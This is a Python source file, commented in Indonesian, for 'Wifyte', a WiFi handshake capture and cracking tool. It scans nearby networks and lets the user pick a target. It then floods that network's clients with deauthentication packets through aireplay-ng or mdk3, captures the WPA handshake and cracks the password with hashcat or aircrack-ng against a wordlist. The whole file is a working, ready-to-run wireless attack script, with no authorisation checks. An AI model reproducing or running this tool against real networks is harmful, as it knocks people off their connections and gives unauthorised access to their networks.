#!/usr/bin/env python3
import os
import re
import time
import signal
import subprocess
import sys
from dataclasses import dataclass
from typing import List, Optional, Tuple
import shutil
from datetime import datetime
import tempfile
import threading


# Warna untuk output
class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


@dataclass
class WiFiNetwork:
    id: int
    bssid: str
    channel: int
    power: int
    essid: str
    encryption: str

    def __str__(self) -> str:
        return f"{Colors.BOLD}[{self.id}]{Colors.ENDC} {Colors.GREEN}{self.essid}{Colors.ENDC} ({self.bssid}) - CH:{self.channel} PWR:{self.power} {Colors.YELLOW}{self.encryption}{Colors.ENDC}"


class Wifyte:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.networks = []
        self.temp_dir = tempfile.mkdtemp()
        self.handshake_dir = os.path.join(os.getcwd(), "handshakes")
        self.stop_capture = False
        self.handshake_found = False

        # Membuat direktori handshakes jika belum ada
        if not os.path.exists(self.handshake_dir):
            os.makedirs(self.handshake_dir)

        self.wordlist_path = os.path.join(os.getcwd(), "wifyte.txt")

        # Cek apakah wordlist ada
        if not os.path.exists(self.wordlist_path):
            print(
                f"{Colors.YELLOW}[!] Wordlist tidak ditemukan di {self.wordlist_path}{Colors.ENDC}"
            )
            print(f"{Colors.YELLOW}[!] Membuat wordlist default...{Colors.ENDC}")
            with open(self.wordlist_path, "w") as f:
                f.write("password\n12345678\nqwerty123\nadmin123\nwifi12345\n")
            print(f"{Colors.GREEN}[+] Wordlist default dibuat{Colors.ENDC}")

    def cleanup(self):
        """Membersihkan file temporary"""
        try:
            shutil.rmtree(self.temp_dir)
        except Exception as e:
            print(
                f"{Colors.RED}[!] Error saat membersihkan direktori temp: {e}{Colors.ENDC}"
            )

    def __del__(self):
        self.cleanup()

    def execute_command(
        self, command, shell=False, capture_output=True, text=True
    ) -> subprocess.CompletedProcess:
        """Menjalankan shell command dengan error handling"""
        try:
            result = subprocess.run(
                command, shell=shell, capture_output=capture_output, text=text
            )
            return result
        except Exception as e:
            print(f"{Colors.RED}[!] Error saat menjalankan command: {e}{Colors.ENDC}")
            print(f"{Colors.RED}[!] Command: {command}{Colors.ENDC}")
            return None

    def find_wifi_interfaces(self) -> List[str]:
        """Menemukan semua interface wifi yang tersedia"""
        result = self.execute_command(["iwconfig"], shell=True)
        if not result or result.returncode != 0:
            print(
                f"{Colors.RED}[!] Error: Gagal mendapatkan daftar interface wifi{Colors.ENDC}"
            )
            sys.exit(1)

        interfaces = []
        for line in result.stdout.split("\n"):
            if "IEEE 802.11" in line:
                interface = line.split()[0]
                interfaces.append(interface)

        return interfaces

    def check_monitor_mode(self, interface) -> bool:
        """Memeriksa apakah interface dalam mode monitor"""
        result = self.execute_command(["iwconfig", interface])
        if not result or result.returncode != 0:
            return False

        return "Mode:Monitor" in result.stdout

    def enable_monitor_mode(self, interface) -> Optional[str]:
        """Mengaktifkan mode monitor pada interface"""
        # Matikan proses yang mungkin mengganggu
        self.execute_command(["airmon-ng", "check", "kill"])

        # Matikan interface
        self.execute_command(["ifconfig", interface, "down"])

        # Ubah ke mode monitor
        result = self.execute_command(["airmon-ng", "start", interface])
        if not result or result.returncode != 0:
            print(
                f"{Colors.RED}[!] Error: Gagal mengaktifkan mode monitor pada {interface}{Colors.ENDC}"
            )
            return None

        # Cari nama interface monitor yang dibuat
        match = re.search(
            r"(Created monitor mode interface|monitor mode enabled on) (\w+)",
            result.stdout,
        )
        if match:
            monitor_interface = match.group(2)
        else:
            # Cara alternatif jika format output berbeda
            interfaces_after = self.find_wifi_interfaces()
            for iface in interfaces_after:
                if self.check_monitor_mode(iface):
                    monitor_interface = iface
                    break
            else:
                monitor_interface = f"{interface}mon"  # Asumsi default airmon-ng

        # Memastikan interface up
        self.execute_command(["ifconfig", monitor_interface, "up"])

        print(
            f"{Colors.GREEN}[+] Mode monitor aktif pada interface {monitor_interface}{Colors.ENDC}"
        )
        return monitor_interface

    def disable_monitor_mode(self, monitor_interface) -> bool:
        """Menonaktifkan mode monitor"""
        result = self.execute_command(["airmon-ng", "stop", monitor_interface])
        if not result or result.returncode != 0:
            print(
                f"{Colors.RED}[!] Error: Gagal menonaktifkan mode monitor{Colors.ENDC}"
            )
            return False

        # Restart NetworkManager untuk mengembalikan koneksi normal
        self.execute_command(
            ["service", "NetworkManager", "restart"], capture_output=False
        )

        print(
            f"{Colors.GREEN}[+] Mode monitor dinonaktifkan dan NetworkManager direstart{Colors.ENDC}"
        )
        return True

    def setup_interface(self):
        """Menyiapkan interface wifi untuk scanning"""
        print(f"{Colors.BLUE}[*] Mencari interface wifi...{Colors.ENDC}")
        interfaces = self.find_wifi_interfaces()

        if not interfaces:
            print(
                f"{Colors.RED}[!] Error: Tidak ada interface wifi ditemukan{Colors.ENDC}"
            )
            sys.exit(1)

        # Cek apakah ada interface yang sudah dalam mode monitor
        for interface in interfaces:
            if self.check_monitor_mode(interface):
                print(
                    f"{Colors.GREEN}[+] Interface {interface} sudah dalam mode monitor{Colors.ENDC}"
                )
                self.monitor_interface = interface
                return

        # Jika tidak ada yang dalam mode monitor, pilih interface pertama
        self.interface = interfaces[0]
        print(f"{Colors.GREEN}[+] Menggunakan interface {self.interface}{Colors.ENDC}")

        # Aktifkan mode monitor
        self.monitor_interface = self.enable_monitor_mode(self.interface)
        if not self.monitor_interface:
            print(
                f"{Colors.RED}[!] Error: Gagal mengaktifkan mode monitor{Colors.ENDC}"
            )
            sys.exit(1)

    def scan_networks(self) -> List[WiFiNetwork]:
        """Melakukan scanning jaringan wifi yang tersedia"""
        if not self.monitor_interface:
            print(
                f"{Colors.RED}[!] Error: Tidak ada interface monitor mode{Colors.ENDC}"
            )
            return []

        print(f"{Colors.BLUE}[*] Memulai scanning jaringan WiFi...{Colors.ENDC}")
        print(
            f"{Colors.YELLOW}[!] Tekan Ctrl+C untuk menghentikan scanning{Colors.ENDC}"
        )

        # File untuk menyimpan hasil scanning
        output_file = os.path.join(self.temp_dir, "scan-01.csv")

        # Jalankan airodump-ng untuk scanning
        proc = subprocess.Popen(
            [
                "airodump-ng",
                "-w",
                os.path.join(self.temp_dir, "scan"),
                "--output-format",
                "csv",
                self.monitor_interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        try:
            # Scan selama 6 detik (lebih cepat dari sebelumnya)
            for i in range(6):
                time.sleep(1)
                print(f"{Colors.BLUE}[*] Scanning... {i+1}/6{Colors.ENDC}", end="\r")
            print("\n")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Scanning dihentikan oleh user{Colors.ENDC}")
        finally:
            proc.send_signal(signal.SIGTERM)
            proc.wait()

        networks = []

        # Parse hasil scanning dari file CSV
        try:
            if os.path.exists(output_file):
                with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                    lines = f.readlines()

                # Lewati header
                data_section = False
                network_id = 0

                for line in lines:
                    line = line.strip()
                    if line.startswith("BSSID"):
                        data_section = True
                        continue

                    if line.startswith("Station MAC"):
                        break

                    if data_section and line:
                        parts = [part.strip() for part in line.split(",")]
                        if len(parts) >= 14:
                            network_id += 1
                            bssid = parts[0]
                            power = (
                                int(parts[8].strip())
                                if parts[8].strip()
                                and parts[8].strip().lstrip("-").isdigit()
                                else 0
                            )
                            channel = (
                                int(parts[3].strip())
                                if parts[3].strip() and parts[3].strip().isdigit()
                                else 0
                            )
                            encryption = parts[5].strip() + " " + parts[6].strip()
                            essid = parts[13].strip().replace("\x00", "")

                            if essid:  # Hanya tambahkan jaringan dengan ESSID
                                networks.append(
                                    WiFiNetwork(
                                        id=network_id,
                                        bssid=bssid,
                                        channel=channel,
                                        power=power,
                                        essid=essid,
                                        encryption=encryption,
                                    )
                                )
            else:
                print(
                    f"{Colors.RED}[!] Error: File hasil scanning tidak ditemukan{Colors.ENDC}"
                )
        except Exception as e:
            print(
                f"{Colors.RED}[!] Error saat membaca hasil scanning: {e}{Colors.ENDC}"
            )

        return networks

    def deauth_clients(self, network: WiFiNetwork) -> bool:
        """Melakukan deauth pada semua client di jaringan target dengan metode yang lebih efektif"""
        if not self.monitor_interface:
            print(
                f"{Colors.RED}[!] Error: Tidak ada interface monitor mode{Colors.ENDC}"
            )
            return False

        print(
            f"{Colors.BLUE}[*] Melakukan deauth agresif pada {network.essid} ({network.bssid})...{Colors.ENDC}"
        )

        # Metode 1: Deauth broadcast (semua client)
        deauth_cmd1 = [
            "aireplay-ng",
            "--deauth",
            "60",  # Lebih banyak paket deauth
            "-a",
            network.bssid,
            self.monitor_interface,
        ]

        # Jalankan deauth dalam thread terpisah untuk tidak memblokir program
        def run_deauth():
            self.execute_command(deauth_cmd1, capture_output=False)

        deauth_thread = threading.Thread(target=run_deauth)
        deauth_thread.daemon = True
        deauth_thread.start()

        # Berikan waktu singkat untuk memastikan paket deauth terkirim
        time.sleep(1)

        print(f"{Colors.GREEN}[+] Deauth packets berhasil dikirim{Colors.ENDC}")
        return True

    def check_for_handshake(self, cap_file: str) -> bool:
        """Memeriksa file capture untuk handshake"""
        if not os.path.exists(cap_file):
            return False

        # Metode 1: Menggunakan aircrack-ng
        aircrack_result = self.execute_command(["aircrack-ng", cap_file])
        if aircrack_result and "1 handshake" in aircrack_result.stdout:
            return True

        # Metode 2: Menggunakan cowpatty (jika tersedia) - verifikasi lebih akurat
        cowpatty_path = shutil.which("cowpatty")
        if cowpatty_path:
            cowpatty_result = self.execute_command(["cowpatty", "-c", "-r", cap_file])
            if (
                cowpatty_result
                and "Collected all necessary data to mount crack against WPA"
                in cowpatty_result.stdout
            ):
                return True

        # Metode 3: Menggunakan pyrit (jika tersedia) - verifikasi lebih akurat lagi
        pyrit_path = shutil.which("pyrit")
        if pyrit_path:
            pyrit_result = self.execute_command(["pyrit", "-r", cap_file, "analyze"])
            if (
                pyrit_result
                and "handshake(s)" in pyrit_result.stdout
                and not "0 handshake(s)" in pyrit_result.stdout
            ):
                return True

        return False

    def handshake_watcher(self, capture_path: str, network: WiFiNetwork):
        """Thread untuk memantau file capture dan mengecek handshake"""
        cap_file = f"{capture_path}-01.cap"
        check_interval = 0.5  # Cek setiap 0.5 detik

        while not self.stop_capture:
            if os.path.exists(cap_file) and self.check_for_handshake(cap_file):
                print(f"{Colors.GREEN}[+] Handshake terdeteksi!{Colors.ENDC}")
                self.handshake_found = True
                self.stop_capture = True
                break
            time.sleep(check_interval)

    def capture_handshake(self, network: WiFiNetwork) -> Optional[str]:
        """Menangkap handshake dari jaringan target dengan metode yang ditingkatkan"""
        if not self.monitor_interface:
            print(
                f"{Colors.RED}[!] Error: Tidak ada interface monitor mode{Colors.ENDC}"
            )
            return None

        # Nama file untuk handshake
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        capture_name = f"{network.essid.replace(' ', '_')}_{timestamp}"
        capture_path = os.path.join(self.temp_dir, capture_name)

        print(
            f"{Colors.BLUE}[*] Memulai capture handshake untuk {network.essid}...{Colors.ENDC}"
        )

        # Reset flag
        self.stop_capture = False
        self.handshake_found = False

        # Jalankan airodump-ng untuk capture handshake
        capture_cmd = [
            "airodump-ng",
            "--bssid",
            network.bssid,
            "--channel",
            str(network.channel),
            "--write",
            capture_path,
            self.monitor_interface,
        ]

        capture_proc = subprocess.Popen(
            capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Mulai thread watcher untuk memeriksa handshake
        watcher_thread = threading.Thread(
            target=self.handshake_watcher, args=(capture_path, network)
        )
        watcher_thread.daemon = True
        watcher_thread.start()

        # Strategi deauth yang lebih agresif
        max_attempts = 8  # Lebih banyak percobaan
        attempt = 0

        try:
            while attempt < max_attempts and not self.handshake_found:
                attempt += 1
                print(
                    f"{Colors.BLUE}[*] Deauth attempt {attempt}/{max_attempts}...{Colors.ENDC}"
                )

                # Kirim deauth packet dengan pendekatan berbeda di setiap percobaan
                if attempt % 2 == 0:
                    # Pendekatan 1: Deauth broadcast
                    subprocess.Popen(
                        [
                            "aireplay-ng",
                            "--deauth",
                            "30",
                            "-a",
                            network.bssid,
                            self.monitor_interface,
                        ],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                else:
                    # Pendekatan 2: MDK3 deauth (jika tersedia)
                    mdk3_path = shutil.which("mdk3")
                    if mdk3_path:
                        subprocess.Popen(
                            ["mdk3", self.monitor_interface, "d", "-b", network.bssid],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )
                    else:
                        # Pendekatan fallback: aireplay dengan lebih banyak paket
                        subprocess.Popen(
                            [
                                "aireplay-ng",
                                "--deauth",
                                "60",
                                "-a",
                                network.bssid,
                                self.monitor_interface,
                            ],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )

                # Tunggu sebentar antara deauth attempts (lebih pendek dari sebelumnya)
                for i in range(3):
                    if self.handshake_found:
                        break
                    time.sleep(1)

            # Final check jika tidak terdeteksi oleh watcher
            cap_file = f"{capture_path}-01.cap"
            if not self.handshake_found and os.path.exists(cap_file):
                self.handshake_found = self.check_for_handshake(cap_file)

            if not self.handshake_found:
                print(
                    f"{Colors.RED}[!] Gagal menangkap handshake setelah {max_attempts} percobaan{Colors.ENDC}"
                )
                return None

            # Salin handshake ke direktori handshakes
            final_path = os.path.join(
                self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
            )
            shutil.copy(cap_file, final_path)
            print(f"{Colors.GREEN}[+] Handshake disimpan ke {final_path}{Colors.ENDC}")

            return final_path

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Capture dibatalkan oleh user{Colors.ENDC}")
            return None
        finally:
            self.stop_capture = True
            capture_proc.send_signal(signal.SIGTERM)
            capture_proc.wait()

    def verify_handshake(self, handshake_path: str) -> bool:
        """Verifikasi apakah handshake valid dengan beberapa metode"""
        if not os.path.exists(handshake_path):
            print(f"{Colors.RED}[!] Error: File handshake tidak ditemukan{Colors.ENDC}")
            return False

        print(
            f"{Colors.BLUE}[*] Memverifikasi handshake dengan multiple tools...{Colors.ENDC}"
        )

        # Metode 1: Aircrack-ng
        aircrack_valid = False
        result = self.execute_command(["aircrack-ng", handshake_path])
        if result and "1 handshake" in result.stdout:
            aircrack_valid = True
            print(f"{Colors.GREEN}[+] Aircrack-ng: Handshake valid{Colors.ENDC}")

        # Metode 2: Cowpatty (jika tersedia)
        cowpatty_valid = False
        cowpatty_path = shutil.which("cowpatty")
        if cowpatty_path:
            result = self.execute_command(["cowpatty", "-c", "-r", handshake_path])
            if (
                result
                and "Collected all necessary data to mount crack against WPA"
                in result.stdout
            ):
                cowpatty_valid = True
                print(f"{Colors.GREEN}[+] Cowpatty: Handshake valid{Colors.ENDC}")

        # Final validation
        is_valid = aircrack_valid or cowpatty_valid

        if is_valid:
            print(f"{Colors.GREEN}[+] Handshake terverifikasi dan valid!{Colors.ENDC}")
        else:
            print(
                f"{Colors.RED}[!] Handshake tidak valid atau tidak lengkap{Colors.ENDC}"
            )

        return is_valid

    def crack_password(self, handshake_path: str) -> Optional[str]:
        """Melakukan cracking password dengan wordlist menggunakan metode optimal"""
        if not os.path.exists(handshake_path):
            print(f"{Colors.RED}[!] Error: File handshake tidak ditemukan{Colors.ENDC}")
            return None

        if not os.path.exists(self.wordlist_path):
            print(f"{Colors.RED}[!] Error: Wordlist tidak ditemukan{Colors.ENDC}")
            return None

        print(f"{Colors.BLUE}[*] Memulai cracking password...{Colors.ENDC}")
        print(
            f"{Colors.BLUE}[*] Menggunakan wordlist: {self.wordlist_path}{Colors.ENDC}"
        )

        # Ekstrak ESSID dari nama file
        essid = os.path.basename(handshake_path).split(".")[0].replace("_", " ")

        # Metode 1: Hashcat (jika tersedia - lebih cepat)
        hashcat_path = shutil.which("hashcat")
        if hashcat_path:
            # Konversi cap ke hccapx format (untuk hashcat)
            hccapx_file = os.path.join(self.temp_dir, "handshake.hccapx")
            self.execute_command(["cap2hccapx", handshake_path, hccapx_file])

            if os.path.exists(hccapx_file):
                print(
                    f"{Colors.BLUE}[*] Menggunakan hashcat untuk cracking (lebih cepat)...{Colors.ENDC}"
                )
                hashcat_cmd = [
                    "hashcat",
                    "-m",
                    "2500",
                    "-a",
                    "0",
                    hccapx_file,
                    self.wordlist_path,
                    "--force",
                ]
                result = self.execute_command(hashcat_cmd)

                if (
                    result
                    and "Recovered" in result.stdout
                    and not "Recovered.....: 0/" in result.stdout
                ):
                    # Ekstrak password dari output hashcat
                    for line in result.stdout.split("\n"):
                        if ":" + essid + ":" in line:
                            password = line.split(":")[-1]
                            print(
                                f"{Colors.GREEN}[+] Password ditemukan: {Colors.BOLD}{password}{Colors.ENDC}"
                            )
                            return password

        # Metode 2: Aircrack-ng (fallback)
        print(
            f"{Colors.BLUE}[*] Menggunakan aircrack-ng untuk cracking...{Colors.ENDC}"
        )
        result = self.execute_command(
            ["aircrack-ng", "-w", self.wordlist_path, handshake_path]
        )
        if not result:
            print(f"{Colors.RED}[!] Error saat cracking password{Colors.ENDC}")
            return None

        # Cek hasil cracking
        if "KEY FOUND!" in result.stdout:
            match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", result.stdout)
            if match:
                password = match.group(1)
                print(
                    f"{Colors.GREEN}[+] Password ditemukan: {Colors.BOLD}{password}{Colors.ENDC}"
                )
                return password

        print(f"{Colors.RED}[!] Password tidak ditemukan dalam wordlist{Colors.ENDC}")
        return None

    def display_banner(self):
        banner = f"""
{Colors.BOLD}{Colors.BLUE}
██╗    ██╗██╗███████╗██╗   ██╗████████╗███████╗
██║    ██║██║██╔════╝╚██╗ ██╔╝╚══██╔══╝██╔════╝
██║ █╗ ██║██║█████╗   ╚████╔╝    ██║   █████╗  
██║███╗██║██║██╔══╝    ╚██╔╝     ██║   ██╔══╝  
╚███╔███╔╝██║██║        ██║      ██║   ███████╗
 ╚══╝╚══╝ ╚═╝╚═╝        ╚═╝      ╚═╝   ╚══════╝
{Colors.ENDC}
{Colors.YELLOW}         WiFi Handshake Capture & Cracking Tool{Colors.ENDC}
{Colors.GREEN}           -- Optimized Speed Version --{Colors.ENDC}
"""
        print(banner)

    def run(self):
        """Menjalankan program utama"""
        self.display_banner()

        # Setup interface
        self.setup_interface()

        # Scan jaringan
        self.networks = self.scan_networks()

        if not self.networks:
            print(f"{Colors.RED}[!] Tidak ada jaringan yang ditemukan.{Colors.ENDC}")
            self.exit_program()
            return

        # Tampilkan hasil scan
        print(
            f"\n{Colors.BLUE}===== {len(self.networks)} Jaringan Ditemukan ====={Colors.ENDC}"
        )
        for network in self.networks:
            print(network)

        # Pilih target
        try:
            network_choice = int(
                input(
                    f"\n{Colors.YELLOW}[?] Pilih jaringan target [1-{len(self.networks)}]: {Colors.ENDC}"
                )
            )
            if network_choice < 1 or network_choice > len(self.networks):
                print(f"{Colors.RED}[!] Pilihan tidak valid{Colors.ENDC}")
                self.exit_program()
                return
        except ValueError:
            print(f"{Colors.RED}[!] Input tidak valid{Colors.ENDC}")
            self.exit_program()
            return
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Program dibatalkan oleh user{Colors.ENDC}")
            self.exit_program()
            return

        target_network = self.networks[network_choice - 1]
        print(
            f"\n{Colors.GREEN}[+] Target dipilih: {target_network.essid} ({target_network.bssid}){Colors.ENDC}"
        )

        # Capture handshake
        handshake_path = self.capture_handshake(target_network)
        if not handshake_path:
            print(f"{Colors.RED}[!] Gagal menangkap handshake{Colors.ENDC}")
            self.exit_program()
            return

        # Verifikasi handshake
        if not self.verify_handshake(handshake_path):
            self.exit_program()
            return

        # Crack password
        self.crack_password(handshake_path)

        # Keluar program
        self.exit_program()

    def exit_program(self):
        """Exit program dengan pilihan untuk mematikan monitor mode"""
        try:
            disable_monitor = (
                input(
                    f"\n{Colors.YELLOW}[?] Matikan monitor mode? (y/n): {Colors.ENDC}"
                ).lower()
                == "y"
            )

            if disable_monitor and self.monitor_interface:
                self.disable_monitor_mode(self.monitor_interface)
            else:
                print(
                    f"{Colors.GREEN}[+] Monitor mode tetap aktif pada {self.monitor_interface}{Colors.ENDC}"
                )

            print(f"{Colors.BLUE}[*] Program selesai. Terima kasih!{Colors.ENDC}")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Program dibatalkan oleh user{Colors.ENDC}")
            if self.monitor_interface:
                print(
                    f"{Colors.GREEN}[+] Monitor mode tetap aktif pada {self.monitor_interface}{Colors.ENDC}"
                )


if __name__ == "__main__":
    try:
        # Cek apakah dijalankan sebagai root
        if os.geteuid() != 0:
            print(
                f"{Colors.RED}[!] Error: Program ini memerlukan akses root. Jalankan dengan 'sudo'{Colors.ENDC}"
            )
            sys.exit(1)

        # Cek dependensi
        dependencies = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
        missing_deps = []

        for dep in dependencies:
            if shutil.which(dep) is None:
                missing_deps.append(dep)

        if missing_deps:
            print(
                f"{Colors.RED}[!] Error: Beberapa dependensi tidak ditemukan: {', '.join(missing_deps)}{Colors.ENDC}"
            )
            print(
                f"{Colors.YELLOW}[!] Silakan install aircrack-ng suite terlebih dahulu:{Colors.ENDC}"
            )
            print(f"{Colors.YELLOW}    sudo apt-get install aircrack-ng{Colors.ENDC}")
            sys.exit(1)

        wifyte = Wifyte()
        wifyte.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program dibatalkan oleh user{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error tidak terduga: {e}{Colors.ENDC}")
